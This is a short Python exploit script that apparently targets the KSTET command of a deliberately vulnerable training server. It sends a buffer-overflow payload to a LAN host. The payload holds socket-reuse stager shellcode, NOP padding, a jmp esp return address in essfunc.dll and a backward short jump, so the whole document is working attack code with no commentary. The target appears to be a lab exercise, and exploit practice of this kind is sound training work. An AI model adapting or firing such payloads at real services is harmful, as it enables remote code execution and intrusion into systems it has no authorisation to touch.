#!/usr/bin/python
import time
import os
import socket
import sys

host = '192.168.100.118'
port = 9999

# SocketStager - 35 bytes long
socketStager  = '\x54\x58\x66\x05\x88\x01\x83\xEC'
socketStager += '\x64\x33\xDB\x53\x80\xC7\x04\x53'
socketStager += '\x54\x5B\x66\x83\xC3\x64\x53\xFF'
socketStager += '\x30\xB8\x90\x2C\x25\x40\xC1\xE8'
socketStager += '\x08\xFF\xD0'

buffer =  'KSTET '
buffer += socketStager
buffer += '\x90' * 35
buffer += '\xAF\x11\x50\x62'  # 0x625011AF - jmp esp - essfunc.dll
buffer += '\xEB\xB4'	      # Short jump - Jmp 00B7F9C2
buffer += '\x90' * 500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.recv(1024)
s.send(buffer)

time.sleep(5)
s.send("A"* 1024)

# s.close()
